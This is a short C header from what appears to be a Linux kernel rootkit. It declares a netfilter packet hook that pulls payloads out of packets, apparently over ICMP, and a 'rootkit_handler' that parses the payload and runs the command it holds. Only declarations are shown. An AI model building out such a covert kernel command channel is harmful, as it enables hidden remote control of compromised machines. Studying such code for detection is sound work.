#ifndef FUNCTION_HEADER
#define FUNCTION_HEADER

#include <linux/module.h>
#include <linux/netfilter_ipv4.h>
#include <linux/workqueue.h>


#include "debug.h"
#include "icmp.h"
#include "commands.h"
#include "args.h"
#include "hooks.h"


// parses the payload and performs the command
void rootkit_handler(struct work_struct* work);

// gets the packet payload and schedules the work which will perform the action and send answer
unsigned int packet_reciever(void *priv, struct sk_buff *skb, const struct nf_hook_state *state);



#endif